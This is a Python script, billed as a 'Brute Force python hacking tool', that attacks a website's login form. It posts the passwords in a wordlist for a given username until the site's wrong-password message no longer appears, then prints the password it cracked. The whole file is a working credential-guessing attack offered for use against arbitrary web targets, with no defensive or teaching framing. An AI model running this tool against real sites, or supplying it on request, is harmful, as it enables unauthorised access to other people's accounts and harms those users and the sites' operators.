######################################################################################################
# Title: Brute force                                                                                 #
# Author: Tanvir Hossain Antu                                                                        #
# Github : https://github.com/Antu7                                                                  #
######################################################################################################

import requests
import time
import sys
import concurrent.futures
from argparse import ArgumentParser

from classes.const import *


def web_url(value: str) -> str:
    if "http://" not in value and "https://" not in value:
        print("Please specify addres with correct prefix (http, https)")
        exit()
    try:
        if requests.get(value).status_code != 200:
            print(requests.get(value).status_code)
            raise requests.exceptions.ConnectionError()
    except requests.exceptions.ConnectionError:
        print(f"Sorry, {value} is not active!")
        exit()
    return value


args = {}
if "-i" in sys.argv:
    INTERACTIVE = True
else:
    parser = ArgumentParser(description="Brute Force python hacking tool")
    parser.add_argument("url", type=web_url, help="URL of website to perform BF attack on")
    parser.add_argument("username", type=str, help="Username on website form")
    parser.add_argument("error", type=str, help="Website error message when password is wrong")
    parser.add_argument("--login-field", type=str, help="Login field name from POST request on website")
    parser.add_argument("--password-field", type=str, help="Password field name from POST request on website")
    args = vars(parser.parse_args())
    
    INTERACTIVE = False

print(BANNER)

if INTERACTIVE:
    args['url'] = input("Enter Target Url: ")
    args['username'] = input("Enter Target Username: ")
    args['error'] = input("Enter Wrong Password Error Message: ")
    args['login_field'] = input("Enter login field name (in POST request) [def: login]: ")
    args['password_field'] = input("Enter password field name (in POST request) [def: password]: ")


args['login_field'] = "login" if not args['login_field'] else args['login_field']
args['password_field'] = "password" if not args['password_field'] else args['password_field']


for c in LOADING_BANNER:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.02)

try: 
    def bruteCracking(username,url,error):
        count = 0
        for password in passwords:
            password = password.strip()
            count = count + 1
            print("Trying Password: "+ str(count) + ' Time For => ' + password)
            data_dict = {args['login_field']: username,args['password_field']: password, "Log In":"submit"}
            response = requests.post(url, data=data_dict)
            if error in str(response.content):
                pass
            elif "csrf" in str(response.content).lower():
                print(str(response.content))
                print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
                exit()
            else:
                print("Username: ---> " + username)
                print("Password: ---> " + password)
                exit()
except:
    print("Some Error Occurred Please Check Your Internet Connection !!")

with open("passwords.txt", "r") as passwords:
    bruteCracking(args['username'],args['url'],args['error'])

print("[!!] password not in list")